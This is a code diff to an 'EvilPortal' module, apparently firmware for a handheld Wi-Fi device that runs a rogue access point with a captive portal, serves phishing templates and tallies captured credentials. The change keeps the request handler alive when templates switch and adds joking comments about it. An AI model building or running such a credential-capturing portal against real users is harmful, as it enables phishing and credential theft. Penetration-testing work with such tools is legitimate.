@@ -236,6 +236,11 @@ void EvilPortal::setupRoutes() {
     });
 
     // Store handler pointer for cleanup
+    // DO NOT TOUCH THIS HANDLER
+    // Do not stop it, do not delete it, do not breathe near it
+    // It is a lone wolf that likes its space
+    // Looking at it wrong will crash the entire system
+    // Let it be. It knows what it's doing.
     _captiveHandler = new CaptiveRequestHandler(this);
     webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
@@ -306,7 +311,6 @@ void EvilPortal::loop() {
                     String oldOutputFile = outputFile;
                     bool oldIsDefault = isDefaultHtml;
                     String oldHtmlFile = htmlFileName;
-                    int oldCredCount = totalCapturedCredentials;
                     bool oldReturnToMenu = returnToMenu;
                     returnToMenu = false;
                     
@@ -341,32 +345,18 @@ void EvilPortal::loop() {
                         }
                         
                         if (!returnToMenu && apName != "") {
-                            // Apply new settings - restart portal with new template
                             displayTextLine("Applying new template...");
                             vTaskDelay(500);
                             
-                            // Clean up old handler
-                            if (_captiveHandler) {
-                                webServer.removeHandler(_captiveHandler);
-                                delete _captiveHandler;
-                                _captiveHandler = nullptr;
+                            // If AP name changed, update it
+                            if (apName != oldApName) {
+                                WiFi.softAP(apName, emptyString, _channel);
+                                vTaskDelay(100);
                             }
                             
-                            // Restart AP with new settings
-                            webServer.end();
-                            dnsServer.stop();
-                            vTaskDelay(100);
-                            
-                            WiFi.softAP(apName, emptyString, _channel);
-                            vTaskDelay(100);
-                            
-                            setupRoutes();
-                            dnsServer.start(53, "*", WiFi.softAPIP());
-                            webServer.begin();
-                            
-                            // Re-add handler
-                            _captiveHandler = new CaptiveRequestHandler(this);
-                            webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+                            // Server keeps running with new HTML content
+                            // Handler remains untouched (remember: DO NOT TOUCH THE HANDLER)
+                            // Next request will serve the new template
                             
                             displayTextLine("Template changed!");
                             vTaskDelay(500);
@@ -379,7 +369,6 @@ void EvilPortal::loop() {
                         outputFile = oldOutputFile;
                         isDefaultHtml = oldIsDefault;
                         htmlFileName = oldHtmlFile;
-                        totalCapturedCredentials = oldCredCount;
                     }
                     
                     returnToMenu = oldReturnToMenu;
@@ -416,8 +405,10 @@ void EvilPortal::loop() {
                 // Restore original WiFi mode
                 WiFi.mode(_originalWifiMode);
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-                
-                // Disconnect to save battery
+
+                // Stop wifi else it will stay on but not connected to any AP
+                // and the stack will get confused so no connect/disconnect option
+                // will be shown on wifi menu after and it will just waste battery
                 wifiDisconnect();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
                 
